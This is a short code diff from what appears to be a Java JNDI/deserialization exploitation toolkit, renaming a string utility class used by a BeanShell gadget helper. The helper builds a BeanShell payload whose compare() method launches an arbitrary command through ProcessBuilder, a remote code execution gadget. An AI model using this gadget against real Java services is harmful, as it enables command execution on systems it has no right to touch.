@@ -1,6 +1,6 @@
 package com.qi4l.jndi.gadgets.utils.beanshell;
 
-import com.qi4l.jndi.gadgets.utils.Strings;
+import com.qi4l.jndi.gadgets.utils.StringUtil;
 import com.qi4l.jndi.gadgets.utils.Utils;
 
 import java.util.Arrays;
@@ -20,7 +20,7 @@ public class BeanShellUtil {
         }
 
         return "compare(Object QI4L, Object QI5L) {new java.lang.ProcessBuilder(new String[]{" +
-                Strings.join(
+                StringUtil.join(
                         Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"").split(" ")), ",", "\"", "\"") + "}).start();return new Integer(1);}";
     }
 
